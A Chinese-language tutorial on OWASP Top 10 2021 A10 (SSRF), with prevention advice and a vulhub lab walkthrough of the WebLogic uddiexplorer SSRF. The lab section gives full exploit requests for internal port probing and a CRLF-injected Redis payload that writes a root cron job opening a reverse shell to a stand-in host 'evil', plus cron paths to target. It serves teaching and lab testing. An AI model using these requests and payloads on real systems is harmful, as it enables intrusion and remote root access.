![](https://image.3001.net/images/20220516/1652698247_62822c87d27b9fce170e0.jpg!small)

最新的2021 Top 10已经出来了，我们从A01开始进行一次详细解读，本系列会详细介绍各个漏洞的变化与内容，并会着重介绍新增的漏洞情况。本篇解读A10
Server-Side Request Forgery (SSRF，服务端请求伪造)。

![mapping.png](https://image.3001.net/images/20220516/1652678906_6281e0faca6ff6cd39836.png!small)

## 因素

可对照 CWEs 数量| 最大发生率| 平均发生率| 最大覆盖范围| 平均覆盖范围| 平均加权漏洞| 平均加权影响| 出现次数| 所有相关 CVEs 数量  
---|---|---|---|---|---|---|---|---  
1| 2.72%| 2.72%| 67.72%| 67.72%| 8.28| 6.72| 9,503| 385  
  
## 概览

这个类别是从产业调查结果加入至此的(#1)。资料显示在测试覆盖率高于平均水准以及利用(Exploit)和冲击(Impact)潜力评等高于平均水准的情况下，此类别发生机率相对较低。因为新报到的类别有可能是在
CWEs 当中受到单一或小群关注的类别而已，因此我们希望此项目可以引来更多人关注，进而在未来版本变成一个较大的类别。

## 描述

当网页应用程式正在取得远端资源，却未验证由使用者提供的网址，此时就会发生伪造服务端请求。即便有防火墙、VPN 或其他网路 ACL
保护的情况下，攻击者仍得以强迫网页应用程式发送一个经过捏造的请求给一个非预期的目的端。

现今的网页应用程式提供终端使用者便利的特色，取得网址已经是常见的了。因此，伪造服务端请求的发生率是在增加当中的。而且，因为云端服务和云端结构的复杂性，伪造服务端请求的严重性将会愈来愈严峻。

## 如何预防

开发者可以预防伪造服务端请求，透过实施下列一部分或全部的纵身防御控制措施：

###  **From Network layer** (从网路层着手)

  * 将远端资源存取功能切割成不同子网路以降低伪造服务端请求之冲击

  * 于防火墙政策或于网路存取控制规则实施"预设全拒绝(deny by default)" ，以封锁全部来自外部之网路流量

###  **From Application layer:** (从应用层)

  * 过滤并验证来自于用户端提供之全部输入

  * 以正面表列方式列出 URL、port、目的地清单

  * 不传送原始回应给用户端

  * 停用 HTTP 重新导向

  * 留意网址之一致性，以避免例如 DNS rebinding 攻击、TOCTOU 攻击

别透过拒绝清单或正规表示式来减缓伪造服务端请求。攻击者有 payload 清单、工具和技巧可以绕过这些拒绝清单

### Example Attack Scenarios (攻击情境范例)

攻击者可以利用伪造服务端请求来攻击在 WAF、防火墙、或网路 ACL 后面的系统，可能采取之情境如下：

 **情境一** ：对内部服务器 port scan。如果网路架构未被切割，攻击者可以透过连线结果或连线所经过的时间或拒绝 SSRF payload
连线的状态，加以对应出内部网路并且判断该等 port 在内部服务器是否开启或关闭状态

 **情境二** ：机敏资料泄漏。攻击者可以存取本地端档案(例如 ) 或内部服务已取得机敏资料。

 **情境三** ：存取云服务之 metadata storage。大部分云端提供者都有 metadata
storage，例如<http://169.254.169.254/>。攻击者可以读取 metadata 以取得机敏资讯。

 **情境四** ：渗透内部服务 - 攻击者可以滥用内部服务去执行更进一步的攻击，例如 RCE 或 Dos

## 实际案例-vulhub

### Weblogic SSRF漏洞

Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。

### 测试环境搭建

编译及启动测试环境

    
    
    docker-compose up -d
    

访问`http://your-ip:7001/uddiexplorer/`，无需登录即可查看uddiexplorer应用。

### SSRF漏洞测试

SSRF漏洞存在于`http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如`http://127.0.0.1:80`：

    
    
    GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
    Host: localhost
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    

可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回`did not have a valid SOAP
content-type`。

![image](https://image.3001.net/images/20221129/1669655304_6384eb08b846db3a711c6.png!small)

修改为一个不存在的端口，将会返回`could not connect over HTTP to server`。

![image](https://image.3001.net/images/20221129/1669655321_6384eb19a5b1ef3d5f0f7.png!small)

通过错误的不同，即可探测内网状态。

### 注入HTTP头，利用Redis反弹shell

Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入`%0a%0d`来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。

首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现`172.18.0.2:6379`可以连通：

![image](https://image.3001.net/images/20221129/1669655333_6384eb258887803a139ae.png!small)

发送三条redis命令，将弹shell脚本写入`/etc/crontab`：

    
    
    set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/evil/21 0>&1'\n\n\n\n"
    config set dir /etc/
    config set dbfilename crontab
    save
    

进行url编码：

    
    
    set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
    

注意，换行符是“\r\n”，也就是“%0D%0A”。

将url编码后的字符串放在ssrf的域名后面，发送：

    
    
    GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1
    Host: localhost
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    

![image](https://image.3001.net/images/20221129/1669655347_6384eb33e67de04c98a48.png!small)

成功反弹：

![image](https://image.3001.net/images/20221129/1669655358_6384eb3e5b96b140e1e7c.png!small)

最后补充一下，可进行利用的cron有如下几个地方：

  * /etc/crontab 这个是肯定的

  * /etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。

  * /var/spool/cron/root centos系统下root用户的cron文件

  * /var/spool/cron/crontabs/root debian系统下root用户的cron文件

